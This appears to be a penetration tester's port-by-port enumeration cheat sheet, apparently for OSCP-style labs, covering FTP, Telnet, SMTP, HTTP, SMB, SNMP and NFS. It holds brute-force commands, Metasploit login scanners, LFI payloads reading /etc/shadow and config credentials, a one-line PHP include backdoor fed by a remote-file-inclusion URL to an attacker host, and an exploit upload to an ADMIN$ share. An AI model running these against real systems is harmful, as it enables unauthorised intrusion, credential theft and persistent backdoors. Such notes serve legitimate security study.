# -------------
##  ----EXTRA-----:

# Enumerating

This is the essential part of penetration. Find out what is available and how you could punch through it with minimum ease.

DO NOT SKIP STEPS.

DO NOT PASS GO.

SEARCH ***ALL*** THE VERSIONS WITH `searchsploit`
(or google -> `site:exploit-db.com APP VERSION`)

# FTP - 21

- Anonymous login
- Enumerate the hell out of the machine!
  - OS version
  - Other software you can find on the machine (Prog Files, yum.log, /bin)
  - password files
  - DLLs for `msfpescan` / BOF targets
- Do you have UPLOAD potential?
  - Can you trigger execution of uploads?
  - Swap binaries?
- Vulnerabilities in version / RCE / #WINNING?-D


####--NEW--
nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 10.11.1.8


# SSH - 22

Unless you get a MOTD or a broken sshd version, you are SOOL and this is likely just a secondary access point once you break something else.

# TELNET - 25
```
nmap -p 23 --script telnet-brute --script-args

userdb=/usr/share/metasploit-framework/data/wordlists/unix_users,passdb=/usr/share/wordlists/rockyou.txt,telnet-brute.timeout=20s 10.11.1.22
```
## metasploit

### 1.  telnet bruteforce
```
use auxiliary/scanner/telnet/telnet_login
msf auxiliary(telnet_login) > set BLANK_PASSWORDS false
BLANK_PASSWORDS => false
msf auxiliary(telnet_login) > set PASS_FILE passwords.txt
PASS_FILE => passwords.txt
msf auxiliary(telnet_login) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(telnet_login) > set THREADS 254
THREADS => 254
msf auxiliary(telnet_login) > set USER_FILE users.txt
USER_FILE => users.txt
msf auxiliary(telnet_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(telnet_login) > run

msf auxiliary(telnet_login) > sessions -l  // to see the sessions that succeded
```

### 2. telnet version
```
use auxiliary/scanner/telnet/telnet_version
msf auxiliary(telnet_version) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(telnet_version) > set THREADS 254
THREADS => 254
msf auxiliary(telnet_version) > run
```
# Email - 25, 110/995 or 143/993

## SMTP, POP3(s) and IMAP(s) are good for enumerating users.

```
smtp-user-enum  //in Kali
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.11.1.22
```
#### SMTP sendmail commands:
```
bash-2.05a$ telnet localhost 25
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
220 barry ESMTP Sendmail 8.11.6/8.11.6; Sun, 20 Aug 2017 00:01:02 +0300
help
214-2.0.0 This is sendmail version 8.11.6
214-2.0.0 Topics:
214-2.0.0 	HELO	EHLO	MAIL	RCPT	DATA
214-2.0.0 	RSET	NOOP	QUIT	HELP	VRFY
214-2.0.0 	EXPN	VERB	ETRN	DSN	AUTH
214-2.0.0 	STARTTLS
214-2.0.0 For more info use "HELP <topic>".
214-2.0.0 To report bugs in the implementation send email to
214-2.0.0 	sendmail-bugs@sendmail.org.
214-2.0.0 For local information send email to Postmaster at your site.
214 2.0.0 End of HELP info
AUTH
503 5.3.3 AUTH mechanism  not available
EHLO barry
250-barry Hello localhost [127.0.0.1], pleased to meet you
250-ENHANCEDSTATUSCODES
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ONEX
250-ETRN
250-XUSR
250 HELP
AUTH LOGIN
````

# TFTP - UDP 69

- Read / Write access?
  - Pretty much same things as FTP



Also: ***CHECK VERSIONS*** and `searchsploit`





# HTTP - 80, 8080, 8000

```
curl -i ${IP}/robots.txt
```

Note down Server and other module versions.

searchsploit them ALL.

Visit all URLs from robots.txt.

```
nikto -host $IP
```

```
gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt

gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt
```

if nothing, find more web word lists.

*Browse the site* but keep an eye on the burp window / source code / cookies etc.

Things to be on look for:

- Default credentials for software
- SQL-injectable GET/POST params
- LFI/RFI through ?page=foo type params
- LFI:
  - `/etc/passwd` | `/etc/shadow` insta-win
  - `/var/www/html/config.php` or similar paths to get SQL etc creds
  - `?page=php://filter/convert.base64-encode/resource=../config.php`
  - `../../../../../boot.ini` to find out windows version
- RFI:
  - Have your PHP/cgi downloader ready
  - `<?php include $_GET['inc']; ?>` simplest backdoor to keep it dynamic without anything messing your output
  - Then you can just `http://$IP/inc.php?inc=http://$YOURIP/bg.php` and have full control with minimal footprint on target machine
  - get `phpinfo()`

### WEB-SERVICES/CMS's:
CMS	https://github.com/s0wr0b1ndef/OSCP-note/tree/master/ENUMERATION/CMS
```
This program attempts to brute-force guess the plugins and themes
installed in a CMS by requesting each plugin or theme name and
looking at the response codes.

The software can currently brute force themes and plugins/modules in:
	Wordpress
	Drupal
	Joomla!
	Mambo
  ```
# HTTPS - 443

Heartbleed / CRIME / Other similar attacks

Read the actual SSL CERT to:

- find out potential correct vhost to GET
- is the clock skewed
- any names that could be usernames for bruteforce/guessing.



# SMB - 139, 445

```
enum4linux -a $IP
```

Read through the report and search for versions of things => `searchsploit`

```
smbclient -L $IP
```

Mount shares

```
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
```

Can you access shares?

- Directly exploitable MSxx-xxx versions?
  - Worth burning MSF strike?


# NEW:
## == SMB NETBIOS==
```
enum4linux x.x.x.x

nmap -v -p 139,445 -oG smb.txt 192.168.11.200-254

nbtscan -r 192.168.11.0/24

nmblookup -A target

smbclient //192.168.31.147/kathy -I 192.168.31.147

rpcclient -U "" target // connect as blank user /nobody

smbmap -u "" -p "" -d MYGROUP -H 10.11.1.22
```
#### SMB version
```
msf auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.31.142
RHOSTS => 192.168.31.142
msf auxiliary(scanner/smb/smb_version) > run
[*] 192.168.31.142:139    - Host could not be identified: Unix (Samba 2.2.1a)
```
#### SMB brute force
```
use auxiliary/scanner/smb/smb_login
```
#### Existing users
```
msf auxiliary(scanner/smb/smb_lookupsid) > use auxiliary/scanner/smb/smb_lookupsid
msf auxiliary(scanner/smb/smb_lookupsid) > set RHOSTS 192.168.31.142
RHOSTS => 192.168.31.142
msf auxiliary(scanner/smb/smb_lookupsid) > run
[*] 192.168.31.142:139    - PIPE(LSARPC) LOCAL(MYGROUP - 5-21-4157223341-3243572438-1405127623) DOMAIN(MYGROUP - )
[*] 192.168.31.142:139    - TYPE=0 NAME=Administrator rid=500

```
#### NetBIOS NullSession enumeration

 ```
####  This  feature  exists  to  allow  unauthenticated  machines  to  obtain  browse  lists  from  other  
#### Microsoft   servers. Enum4linux is a wrapper  built on top of smbclient,rpcclient, net and nmblookup
enum4linux -a 192.168.1.1

```
#### upload file
```
smbclient //192.168.31.142/ADMIN$ -U "nobody"%"somepassword" -c "put 40280.py"
```

#### NMAP SMB scripts
```
nmap --script smb-* --script-args=unsafe=1 192.168.10.55
```

####  ls -lh /usr/share/nmap/scripts/smb*
```
smb-brute.nse
smb-enum-domains.nse
smb-enum-groups.nse
smb-enum-processes.nse
smb-enum-sessions.nse
smb-enum-shares.nse
smb-enum-users.nse
smb-flood.nse
smb-ls.nse
smb-mbenum.nse
smb-os-discovery.nse
smb-print-text.nse
smb-psexec.nse
smb-security-mode.nse
smb-server-stats.nse
smb-system-info.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-regsvc-dos.nse
smbv2-enabled.nse

```
#### mount SMB shares in Linux
```
smbclient -L \\WIN7\ -I 192.168.13.218
smbclient -L \\WIN7\ADMIN$  -I 192.168.13.218
smbclient -L \\WIN7\C$ -I 192.168.13.218
smbclient -L \\WIN7\IPC$ -I 192.168.13.218
smbclient \\192.168.13.236\some-share -o user=root,pass=root,workgroup=BOB
```

#### mount SMB share to a afolder
```
mount -t auto --source //192.168.31.147/kathy --target /tmp/smb/ -o username=root,workgroup=WORKGROUP
```

#### mount SMB shares in Windows (via cmd)
```
net use X: \\<server>\<sharename> /USER:<domain>\<username> <password> /PERSISTENT:YES
```

# SNMP - UDP 161

- Try to enumerate windows shares / network info

Quick test of communities:

```
onesixtyone
```

Full discovery of everything you can:

```
snmp-check
```

## new:

### SNMP
```
nmap -sU -p 161 --script=*snmp* 192.168.1.200
xprobe2 -v -p udp:161:open 192.168.1.200
```
```
msf >  use auxiliary/scanner/snmp/snmp_login
msf > use auxiliary/scanner/snmp/snmp_enum
```
```
snmp-check 192.168.1.2 -c public
snmpget -v 1 -c public IP
snmpwalk -v 1 -c public IP
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
onesixtyone -c /usr/share/wordlists/dirb/small.txt 192.168.1.200  // find communities with bruteforce
```
```
for i in $(cat /usr/share/wordlists/metasploit/unix_users.txt);do snmpwalk -v 1 -c $i 192.168.1.200;done| grep -e "Timeout" // find communities with bruteforce
```


# NFS
```
nmap -sV --script=nfs-* 192.168.44.133
nmap -sV --script=nfs-ls 192.168.44.133  //same result as rpcinfo
nmap -sV --script=nfs-* 192.168.44.133 // all nfs scripts
```

```
rpcinfo -p 192.x.x.x
rpcclient -I 192.x.x.x
```
####  mount NTFS share
```
mount -t nfs 192.168.1.72:/home/vulnix /tmp/mnt -nolock
```
####  enumerate NFS shares
showmount -e 192.168.56.103


####   If you see any NFS related ACL port open, see /etc/exports (check)
````
  2049/tcp  nfs_acl
/etc/exports: the access control list for filesystems which may be exported to NFS clients.  See exports(5).
````
READ:
````
log/tag/rpc/
````
See root squashing
````
https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/
````
